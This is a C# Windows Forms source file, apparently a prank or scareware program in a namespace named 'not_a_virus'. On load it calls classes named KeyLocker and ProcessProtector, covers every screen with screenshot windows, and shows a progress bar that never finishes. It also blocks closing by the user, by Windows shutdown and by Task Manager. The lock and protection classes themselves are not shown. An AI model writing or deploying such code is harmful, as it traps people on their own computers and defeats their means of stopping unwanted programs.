using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace not_a_virus
{
    public partial class Form1 : Form
    {
        public float progressSpeed = 1f;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            new KeyLocker().Lock();
            ProcessProtector.Protect();

            foreach(Screen screen in Screen.AllScreens)
            {
                var screenshotter = new ScreenScreenshotter();
                screenshotter.Show();
                screenshotter.LoadOnScreen(screen);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            progressBar1.Value = Math.Min(progressBar1.Maximum-5, progressBar1.Value + int.Parse(Math.Floor(100f * progressSpeed).ToString())); //(int)Math.Min((float)progressBar1.Maximum-(1000f * (progressSpeed*10)), progressBar1.Value+int.Parse(Math.Floor(100f * progressSpeed).ToString()));
            progressSpeed /= (1.005f * (float)Math.Max(1f, 1f+(progressBar1.Value/1000000f)));
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = (e.CloseReason == CloseReason.UserClosing || e.CloseReason == CloseReason.WindowsShutDown || e.CloseReason == CloseReason.TaskManagerClosing);
        }
    }
}
